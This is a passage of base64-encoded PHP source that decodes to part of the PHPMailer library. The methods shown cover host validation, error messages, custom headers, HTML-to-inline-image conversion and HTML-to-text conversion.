tZSgpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkcmVzdWx0ID0gZ2V0aG9zdG5hbWUoKTsKICAgICAgICB9IGVsc2VpZiAocGhwX3VuYW1lKCduJykgIT09ICcnKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBwaHBfdW5hbWUoJ24nKTsKICAgICAgICB9CiAgICAgICAgaWYgKCFzdGF0aWM6OmlzVmFsaWRIb3N0KCRyZXN1bHQpKSB7CiAgICAgICAgICAgIHJldHVybiAnbG9jYWxob3N0LmxvY2FsZG9tYWluJzsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogVmFsaWRhdGUgd2hldGhlciBhIHN0cmluZyBjb250YWlucyBhIHZhbGlkIHZhbHVlIHRvIHVzZSBhcyBhIGhvc3RuYW1lIG9yIElQIGFkZHJlc3MuCiAgICAgKiBJUHY2IGFkZHJlc3NlcyBtdXN0IGluY2x1ZGUgW10sIGUuZy4gYFs6OjFdYCwgbm90IGp1c3QgYDo6MWAuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkaG9zdCBUaGUgaG9zdCBuYW1lIG9yIElQIGFkZHJlc3MgdG8gY2hlY2sKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBpc1ZhbGlkSG9zdCgkaG9zdCkKICAgIHsKICAgICAgICAvL1NpbXBsZSBzeW50YXggbGltaXRzCiAgICAgICAgaWYgKAogICAgICAgICAgICBlbXB0eSgkaG9zdCkKICAgICAgICAgICAgfHwgIWlzX3N0cmluZygkaG9zdCkKICAgICAgICAgICAgfHwgc3RybGVuKCRob3N0KSA+IDI1NgogICAgICAgICAgICB8fCAhcHJlZ19tYXRjaCgnL14oW2EtelxkLi1dKnxcW1thLWZcZDpdK1xdKSQvaScsICRob3N0KQogICAgICAgICkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIC8vTG9va3MgbGlrZSBhIGJyYWNrZXRlZCBJUHY2IGFkZHJlc3MKICAgICAgICBpZiAoc3RybGVuKCRob3N0KSA+IDIgJiYgc3Vic3RyKCRob3N0LCAwLCAxKSA9PT0gJ1snICYmIHN1YnN0cigkaG9zdCwgLTEsIDEpID09PSAnXScpIHsKICAgICAgICAgICAgcmV0dXJuIGZpbHRlcl92YXIoc3Vic3RyKCRob3N0LCAxLCAtMSksIEZJTFRFUl9WQUxJREFURV9JUCwgRklMVEVSX0ZMQUdfSVBWNikgIT09IGZhbHNlOwogICAgICAgIH0KICAgICAgICAvL0lmIHJlbW92aW5nIGFsbCB0aGUgZG90cyByZXN1bHRzIGluIGEgbnVtZXJpYyBzdHJpbmcsIGl0IG11c3QgYmUgYW4gSVB2NCBhZGRyZXNzLgogICAgICAgIC8vTmVlZCB0byBjaGVjayB0aGlzIGZpcnN0IGJlY2F1c2Ugb3RoZXJ3aXNlIHRoaW5ncyBsaWtlIGA5OTkuMC4wLjBgIGFyZSBjb25zaWRlcmVkIHZhbGlkIGhvc3QgbmFtZXMKICAgICAgICBpZiAoaXNfbnVtZXJpYyhzdHJfcmVwbGFjZSgnLicsICcnLCAkaG9zdCkpKSB7CiAgICAgICAgICAgIC8vSXMgaXQgYSB2YWxpZCBJUHY0IGFkZHJlc3M/CiAgICAgICAgICAgIHJldHVybiBmaWx0ZXJfdmFyKCRob3N0LCBGSUxURVJfVkFMSURBVEVfSVAsIEZJTFRFUl9GTEFHX0lQVjQpICE9PSBmYWxzZTsKICAgICAgICB9CiAgICAgICAgLy9JcyBpdCBhIHN5bnRhY3RpY2FsbHkgdmFsaWQgaG9zdG5hbWUgKHdoZW4gZW1iZWRkZWQgaW4gYSBVUkwpPwogICAgICAgIHJldHVybiBmaWx0ZXJfdmFyKCdodHRwczovLycgLiAkaG9zdCwgRklMVEVSX1ZBTElEQVRFX1VSTCkgIT09IGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgd2hldGhlciB0aGUgc3VwcGxpZWQgYWRkcmVzcyB1c2VzIFVuaWNvZGUgaW4gdGhlIGxvY2FsIHBhcnQuCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRyZXNzSGFzVW5pY29kZUxvY2FsUGFydCgkYWRkcmVzcykKICAgIHsKICAgICAgICByZXR1cm4gKGJvb2wpIHByZWdfbWF0Y2goJy9bXHg4MC1ceEZGXS4qQC8nLCAkYWRkcmVzcyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayB3aGV0aGVyIGFueSBvZiB0aGUgc3VwcGxpZWQgYWRkcmVzc2VzIHVzZSBVbmljb2RlIGluIHRoZSBsb2NhbCBwYXJ0LgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYW55QWRkcmVzc0hhc1VuaWNvZGVMb2NhbFBhcnQoJGFkZHJlc3NlcykKICAgIHsKICAgICAgICBmb3JlYWNoICgkYWRkcmVzc2VzIGFzICRhZGRyZXNzKSB7CiAgICAgICAgICAgIGlmIChpc19hcnJheSgkYWRkcmVzcykpIHsKICAgICAgICAgICAgICAgICRhZGRyZXNzID0gJGFkZHJlc3NbMF07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCR0aGlzLT5hZGRyZXNzSGFzVW5pY29kZUxvY2FsUGFydCgkYWRkcmVzcykpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIHdoZXRoZXIgdGhlIG1lc3NhZ2UgcmVxdWlyZXMgU01UUFVURjggYmFzZWQgb24gd2hhdCdzIGtub3duIHNvIGZhci4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIG5lZWRzU01UUFVURjgoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+VXNlU01UUFVURjg7CiAgICB9CgoKICAgIC8qKgogICAgICogR2V0IGFuIGVycm9yIG1lc3NhZ2UgaW4gdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAka2V5CiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGxhbmcoJGtleSkKICAgIHsKICAgICAgICBpZiAoY291bnQoJHRoaXMtPmxhbmd1YWdlKSA8IDEpIHsKICAgICAgICAgICAgJHRoaXMtPnNldExhbmd1YWdlKCk7IC8vU2V0IHRoZSBkZWZhdWx0IGxhbmd1YWdlCiAgICAgICAgfQoKICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygka2V5LCAkdGhpcy0+bGFuZ3VhZ2UpKSB7CiAgICAgICAgICAgIGlmICgnc210cF9jb25uZWN0X2ZhaWxlZCcgPT09ICRrZXkpIHsKICAgICAgICAgICAgICAgIC8vSW5jbHVkZSBhIGxpbmsgdG8gdHJvdWJsZXNob290aW5nIGRvY3Mgb24gU01UUCBjb25uZWN0aW9uIGZhaWx1cmUuCiAgICAgICAgICAgICAgICAvL1RoaXMgaXMgYnkgZmFyIHRoZSBiaWdnZXN0IGNhdXNlIG9mIHN1cHBvcnQgcXVlc3Rpb25zCiAgICAgICAgICAgICAgICAvL2J1dCBpdCdzIHVzdWFsbHkgbm90IFBIUE1haWxlcidzIGZhdWx0LgogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XSAuICcgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvd2lraS9Ucm91Ymxlc2hvb3RpbmcnOwogICAgICAgICAgICB9CgogICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldOwogICAgICAgIH0KCiAgICAgICAgLy9SZXR1cm4gdGhlIGtleSBhcyBhIGZhbGxiYWNrCiAgICAgICAgcmV0dXJuICRrZXk7CiAgICB9CgogICAgLyoqCiAgICAgKiBCdWlsZCBhbiBlcnJvciBtZXNzYWdlIHN0YXJ0aW5nIHdpdGggYSBnZW5lcmljIG9uZSBhbmQgYWRkaW5nIGRldGFpbHMgaWYgcG9zc2libGUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkYmFzZV9rZXkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByaXZhdGUgZnVuY3Rpb24gZ2V0U210cEVycm9yTWVzc2FnZSgkYmFzZV9rZXkpCiAgICB7CiAgICAgICAgJG1lc3NhZ2UgPSAkdGhpcy0+bGFuZygkYmFzZV9rZXkpOwogICAgICAgICRlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOwogICAgICAgIGlmICghZW1wdHkoJGVycm9yWydlcnJvciddKSkgewogICAgICAgICAgICAkbWVzc2FnZSAuPSAnICcgLiAkZXJyb3JbJ2Vycm9yJ107CiAgICAgICAgICAgIGlmICghZW1wdHkoJGVycm9yWydkZXRhaWwnXSkpIHsKICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICcgJyAuICRlcnJvclsnZGV0YWlsJ107CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJldHVybiAkbWVzc2FnZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGFuIGVycm9yIG9jY3VycmVkLgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIGlmIGFuIGVycm9yIGRpZCBvY2N1cgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNFcnJvcigpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5lcnJvcl9jb3VudCA+IDA7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYSBjdXN0b20gaGVhZGVyLgogICAgICogJG5hbWUgdmFsdWUgY2FuIGJlIG92ZXJsb2FkZWQgdG8gY29udGFpbgogICAgICogYm90aCBoZWFkZXIgbmFtZSBhbmQgdmFsdWUgKG5hbWU6dmFsdWUpLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkbmFtZSAgQ3VzdG9tIGhlYWRlciBuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nfG51bGwgJHZhbHVlIEhlYWRlciB2YWx1ZQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbCBUcnVlIGlmIGEgaGVhZGVyIHdhcyBzZXQgc3VjY2Vzc2Z1bGx5CiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkdmFsdWUgJiYgc3RycG9zKCRuYW1lLCAnOicpICE9PSBmYWxzZSkgewogICAgICAgICAgICAvL1ZhbHVlIHBhc3NlZCBpbiBhcyBuYW1lOnZhbHVlCiAgICAgICAgICAgIGxpc3QoJG5hbWUsICR2YWx1ZSkgPSBleHBsb2RlKCc6JywgJG5hbWUsIDIpOwogICAgICAgIH0KICAgICAgICAkbmFtZSA9IHRyaW0oJG5hbWUpOwogICAgICAgICR2YWx1ZSA9IChudWxsID09PSAkdmFsdWUpID8gJycgOiB0cmltKCR2YWx1ZSk7CiAgICAgICAgLy9FbnN1cmUgbmFtZSBpcyBub3QgZW1wdHksIGFuZCB0aGF0IG5laXRoZXIgbmFtZSBub3IgdmFsdWUgY29udGFpbiBsaW5lIGJyZWFrcwogICAgICAgIGlmIChlbXB0eSgkbmFtZSkgfHwgc3RycGJyaygkbmFtZSAuICR2YWx1ZSwgIlxyXG4iKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdpbnZhbGlkX2hlYWRlcicpKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBbJG5hbWUsICR2YWx1ZV07CgogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJucyBhbGwgY3VzdG9tIGhlYWRlcnMuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q3VzdG9tSGVhZGVycygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5DdXN0b21IZWFkZXI7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgYSBtZXNzYWdlIGJvZHkgZnJvbSBhbiBIVE1MIHN0cmluZy4KICAgICAqIEF1dG9tYXRpY2FsbHkgaW5saW5lcyBpbWFnZXMgYW5kIGNyZWF0ZXMgYSBwbGFpbi10ZXh0IHZlcnNpb24gYnkgY29udmVydGluZyB0aGUgSFRNTCwKICAgICAqIG92ZXJ3cml0aW5nIGFueSBleGlzdGluZyB2YWx1ZXMgaW4gQm9keSBhbmQgQWx0Qm9keS4KICAgICAqIERvIG5vdCBzb3VyY2UgJG1lc3NhZ2UgY29udGVudCBmcm9tIHVzZXIgaW5wdXQhCiAgICAgKiAkYmFzZWRpciBpcyBwcmVwZW5kZWQgd2hlbiBoYW5kbGluZyByZWxhdGl2ZSBVUkxzLCBlLmcuIDxpbWcgc3JjPSIvaW1hZ2VzL2EucG5nIj4gYW5kIG11c3Qgbm90IGJlIGVtcHR5CiAgICAgKiB3aWxsIGxvb2sgZm9yIGFuIGltYWdlIGZpbGUgaW4gJGJhc2VkaXIvaW1hZ2VzL2EucG5nIGFuZCBjb252ZXJ0IGl0IHRvIGlubGluZS4KICAgICAqIElmIHlvdSBkb24ndCBwcm92aWRlIGEgJGJhc2VkaXIsIHJlbGF0aXZlIHBhdGhzIHdpbGwgYmUgbGVmdCB1bnRvdWNoZWQgKGFuZCB0aHVzIHByb2JhYmx5IGJyZWFrIGluIGVtYWlsKQogICAgICogQ29udmVydHMgZGF0YS11cmkgaW1hZ2VzIGludG8gZW1iZWRkZWQgYXR0YWNobWVudHMuCiAgICAgKiBJZiB5b3UgZG9uJ3Qgd2FudCB0byBhcHBseSB0aGVzZSB0cmFuc2Zvcm1hdGlvbnMgdG8geW91ciBIVE1MLCBqdXN0IHNldCBCb2R5IGFuZCBBbHRCb2R5IGRpcmVjdGx5LgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAgICRtZXNzYWdlICBIVE1MIG1lc3NhZ2Ugc3RyaW5nCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgICAkYmFzZWRpciAgQWJzb2x1dGUgcGF0aCB0byBhIGJhc2UgZGlyZWN0b3J5IHRvIHByZXBlbmQgdG8gcmVsYXRpdmUgcGF0aHMgdG8gaW1hZ2VzCiAgICAgKiBAcGFyYW0gYm9vbHxjYWxsYWJsZSAkYWR2YW5jZWQgV2hldGhlciB0byB1c2UgdGhlIGludGVybmFsIEhUTUwgdG8gdGV4dCBjb252ZXJ0ZXIKICAgICAqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvciB5b3VyIG93biBjdXN0b20gY29udmVydGVyCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgdHJhbnNmb3JtZWQgbWVzc2FnZSBib2R5CiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6aHRtbDJ0ZXh0KCkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIG1zZ0hUTUwoJG1lc3NhZ2UsICRiYXNlZGlyID0gJycsICRhZHZhbmNlZCA9IGZhbHNlKQogICAgewogICAgICAgIHByZWdfbWF0Y2hfYWxsKCcvKD88IS0pKHNyY3xiYWNrZ3JvdW5kKT1bIlwnXSguKilbIlwnXS9VaScsICRtZXNzYWdlLCAkaW1hZ2VzKTsKICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygyLCAkaW1hZ2VzKSkgewogICAgICAgICAgICBpZiAoc3RybGVuKCRiYXNlZGlyKSA+IDEgJiYgJy8nICE9PSBzdWJzdHIoJGJhc2VkaXIsIC0xKSkgewogICAgICAgICAgICAgICAgLy9FbnN1cmUgJGJhc2VkaXIgaGFzIGEgdHJhaWxpbmcgLwogICAgICAgICAgICAgICAgJGJhc2VkaXIgLj0gJy8nOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGZvcmVhY2ggKCRpbWFnZXNbMl0gYXMgJGltZ2luZGV4ID0+ICR1cmwpIHsKICAgICAgICAgICAgICAgIC8vQ29udmVydCBkYXRhIFVSSXMgaW50byBlbWJlZGRlZCBpbWFnZXMKICAgICAgICAgICAgICAgIC8vZS5nLiAiZGF0YTppbWFnZS9naWY7YmFzZTY0LFIwbEdPRGxoQVFBQkFBQUFBQ0g1QkFFS0FBRUFMQUFBQUFBQkFBRUFBQUlDVEFFQU93PT0iCiAgICAgICAgICAgICAgICAkbWF0Y2ggPSBbXTsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcjXmRhdGE6KGltYWdlLyg/OmpwZT9nfGdpZnxwbmcpKTs/KGJhc2U2NCk/LCguKykjJywgJHVybCwgJG1hdGNoKSkgewogICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCgkbWF0Y2gpID09PSA0ICYmIHN0YXRpYzo6RU5DT0RJTkdfQkFTRTY0ID09PSAkbWF0Y2hbMl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSBiYXNlNjRfZGVjb2RlKCRtYXRjaFszXSk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKCcnID09PSAkbWF0Y2hbMl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEgPSByYXd1cmxkZWNvZGUoJG1hdGNoWzNdKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAvL05vdCByZWNvZ25pc2VkIHNvIGxlYXZlIGl0IGFsb25lCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAvL0hhc2ggdGhlIGRlY29kZWQgZGF0YSwgbm90IHRoZSBVUkwsIHNvIHRoYXQgdGhlIHNhbWUgZGF0YS1VUkkgaW1hZ2UgdXNlZCBpbiBtdWx0aXBsZSBwbGFjZXMKICAgICAgICAgICAgICAgICAgICAvL3dpbGwgb25seSBiZSBlbWJlZGRlZCBvbmNlLCBldmVuIGlmIGl0IHVzZWQgYSBkaWZmZXJlbnQgZW5jb2RpbmcKICAgICAgICAgICAgICAgICAgICAkY2lkID0gc3Vic3RyKGhhc2goJ3NoYTI1NicsICRkYXRhKSwgMCwgMzIpIC4gJ0BwaHBtYWlsZXIuMCc7IC8vUkZDMjM5MiBTIDIKCiAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+Y2lkRXhpc3RzKCRjaWQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5hZGRTdHJpbmdFbWJlZGRlZEltYWdlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGRhdGEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2lkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VtYmVkJyAuICRpbWdpbmRleCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXRpYzo6RU5DT0RJTkdfQkFTRTY0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1hdGNoWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICAgICAgICAgICAgICRpbWFnZXNbMF1bJGltZ2luZGV4XSwKICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAgICAgLy9Pbmx5IHByb2Nlc3MgcmVsYXRpdmUgVVJMcyBpZiBhIGJhc2VkaXIgaXMgcHJvdmlkZWQgKGkuZS4gbm8gYWJzb2x1dGUgbG9jYWwgcGF0aHMpCiAgICAgICAgICAgICAgICAgICAgIWVtcHR5KCRiYXNlZGlyKQogICAgICAgICAgICAgICAgICAgIC8vSWdub3JlIFVSTHMgY29udGFpbmluZyBwYXJlbnQgZGlyIHRyYXZlcnNhbCAoLi4pCiAgICAgICAgICAgICAgICAgICAgJiYgKHN0cnBvcygkdXJsLCAnLi4nKSA9PT0gZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgLy9EbyBub3QgY2hhbmdlIHVybHMgdGhhdCBhcmUgYWxyZWFkeSBpbmxpbmUgaW1hZ2VzCiAgICAgICAgICAgICAgICAgICAgJiYgMCAhPT0gc3RycG9zKCR1cmwsICdjaWQ6JykKICAgICAgICAgICAgICAgICAgICAvL0RvIG5vdCBjaGFuZ2UgYWJzb2x1dGUgVVJMcywgaW5jbHVkaW5nIGFub255bW91cyBwcm90b2NvbAogICAgICAgICAgICAgICAgICAgICYmICFwcmVnX21hdGNoKCcjXlthLXpdW2EtejAtOSsuLV0qOj8vLyNpJywgJHVybCkKICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICRmaWxlbmFtZSA9IHN0YXRpYzo6bWJfcGF0aGluZm8oJHVybCwgUEFUSElORk9fQkFTRU5BTUUpOwogICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSBkaXJuYW1lKCR1cmwpOwogICAgICAgICAgICAgICAgICAgIGlmICgnLicgPT09ICRkaXJlY3RvcnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICcnOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAvL1JGQzIzOTIgUyAyCiAgICAgICAgICAgICAgICAgICAgJGNpZCA9IHN1YnN0cihoYXNoKCdzaGEyNTYnLCAkdXJsKSwgMCwgMzIpIC4gJ0BwaHBtYWlsZXIuMCc7CiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkYmFzZWRpcikgPiAxICYmICcvJyAhPT0gc3Vic3RyKCRiYXNlZGlyLCAtMSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGJhc2VkaXIgLj0gJy8nOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoc3RybGVuKCRkaXJlY3RvcnkpID4gMSAmJiAnLycgIT09IHN1YnN0cigkZGlyZWN0b3J5LCAtMSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSAuPSAnLyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmFkZEVtYmVkZGVkSW1hZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYmFzZWRpciAuICRkaXJlY3RvcnkgLiAkZmlsZW5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2lkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdGljOjpFTkNPRElOR19CQVNFNjQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0aWM6Ol9taW1lX3R5cGVzKChzdHJpbmcpIHN0YXRpYzo6bWJfcGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19FWFRFTlNJT04pKQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gcHJlZ19yZXBsYWNlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJy8nIC4gJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz1bIlwnXScgLiBwcmVnX3F1b3RlKCR1cmwsICcvJykgLiAnWyJcJ10vVWknLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPmlzSFRNTCgpOwogICAgICAgIC8vQ29udmVydCBhbGwgbWVzc2FnZSBib2R5IGxpbmUgYnJlYWtzIHRvIExFLCBtYWtlcyBxdW90ZWQtcHJpbnRhYmxlIGVuY29kaW5nIHdvcmsgbXVjaCBiZXR0ZXIKICAgICAgICAkdGhpcy0+Qm9keSA9IHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCRtZXNzYWdlKTsKICAgICAgICAkdGhpcy0+QWx0Qm9keSA9IHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCR0aGlzLT5odG1sMnRleHQoJG1lc3NhZ2UsICRhZHZhbmNlZCkpOwogICAgICAgIGlmICghJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAnVGhpcyBpcyBhbiBIVE1MLW9ubHkgbWVzc2FnZS4gVG8gdmlldyBpdCwgYWN0aXZhdGUgSFRNTCBpbiB5b3VyIGVtYWlsIGFwcGxpY2F0aW9uLicKICAgICAgICAgICAgICAgIC4gc3RhdGljOjokTEU7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHRoaXMtPkJvZHk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDb252ZXJ0IGFuIEhUTUwgc3RyaW5nIGludG8gcGxhaW4gdGV4dC4KICAgICAqIFRoaXMgaXMgdXNlZCBieSBtc2dIVE1MKCkuCiAgICAgKiBOb3RlIC0gb2xkZXIgdmVyc2lvbnMgb2YgdGhpcyBmdW5jdGlvbiB1c2VkIGEgYnVuZGxlZCBhZHZhbmNlZCBjb252ZXJ0ZXIKICAgICAqIHdoaWNoIHdhcyByZW1vdmVkIGZvciBsaWNlbnNlIHJlYXNvbnMgaW4gIzIzMi4KICAgICAqIEV4YW1wbGUgdXNhZ2U6CiAgICAgKgogICAgICogYGBgcGhwCiAgICAgKiAvL1VzZSBkZWZhdWx0IGNvbnZlcnNpb24KICAgICAqICRwbGFpbiA9ICRtYWlsLT5odG1sMnRleHQoJGh0bWwpOwogICAgICogLy9Vc2UgeW91ciBvd24gY3VzdG9tIGNvbnZlcnRlcgogICAgICogJHBsYWluID0gJG1haWwtPmh0bWwydGV4dCgkaHRtbCwgZnVuY3Rpb24oJGh0bWwpIHsKICAgICAqICAgICAkY29udmVydGVyID0gbmV3IE15SHRtbDJ0ZXh0KCRodG1sKTsKICAgICAqICAgICByZXR1cm4gJGNvbnZlcnRlci0+Z2V0X3RleHQoKTsKICAgICAqIH0pOwogICAgICogYGBgCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAgICAgICAgJGh0bWwgICAgIFRoZSBIVE1MIHRleHQgdG8gY29udmVydAogICAgICogQHBhcmFtIGJvb2x8Y2FsbGFibGUgJGFkdmFuY2VkIEFueSBib29sZWFuIHZhbHVlIHRvIHVzZSB0aGUgaW50ZXJuYWwgY29udmVydGVyLAogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9yIHByb3ZpZGUgeW91ciBvd24gY2FsbGFibGUgZm9yIGN1c3RvbSBjb252ZXJzaW9uLgogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICpOZXZlciogcGFzcyB1c2VyLXN1cHBsaWVkIGRhdGEgaW50byB0aGlzIHBhcmFtZXRlcgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBodG1sMnRleHQoJGh0bWwsICRhZHZhbmNlZCA9IGZhbHNlKQogICAgewogICAgICAgIGlmIChpc19jYWxsYWJsZSgkYWR2YW5jZWQpKSB7CiAgICAgICAgICAgIHJldHVybiBjYWxsX3VzZXJfZnVuYygkYWR2YW5jZWQsICRodG1sKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiBodG1sX2VudGl0eV9kZWNvZGUoCiAgICAgICAgICAgIHRyaW0oc3RyaXBfdGFncyhwcmVnX3JlcGxhY2UoJy88KGhlYWR8dGl0bGV8c3R5bGV8c2NyaXB0KVtePl0qPi4qPzxcL1xcMT4vc2knLCAnJywgJGh0bWwpKSksCiAgICAgICAgICAgIEVOVF9RVU9URVMsCiAgICAgICAgICAgICR0aGlzLT5DaGFyU2V0CiAgICAgICAgKTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgTUlNRSB0eXBlIGZvciBh